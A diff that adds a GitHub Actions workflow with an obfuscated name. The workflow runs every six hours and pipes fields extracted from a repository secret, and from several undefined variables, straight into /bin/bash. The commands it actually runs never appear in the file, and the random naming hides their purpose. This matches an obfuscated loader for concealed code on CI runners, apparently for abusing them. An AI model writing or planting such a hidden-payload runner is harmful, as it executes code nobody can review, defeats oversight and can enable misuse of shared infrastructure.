@@ -1,0 +1,24 @@
+name: hexiqiongren
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hexiqiongren
+        env:
+          q6: ${{ secrets.q6 }}
+        run: |
+          echo $q6 | jq -r .jcbfm0 | /bin/bash
+          echo $fpm7977 | jq -r .rp31 | /bin/bash
+          echo $a3 | jq -r .vzp1704 | /bin/bash
+          echo $qnazq6 | jq -r .cmobi5423 | /bin/bash
+          echo $uts61456 | jq -r .ro4 | /bin/bash
+          echo $w171 | jq -r .s705 | /bin/bash
+          echo $xytew95 | jq -r .yiyje817 | /bin/bash
+
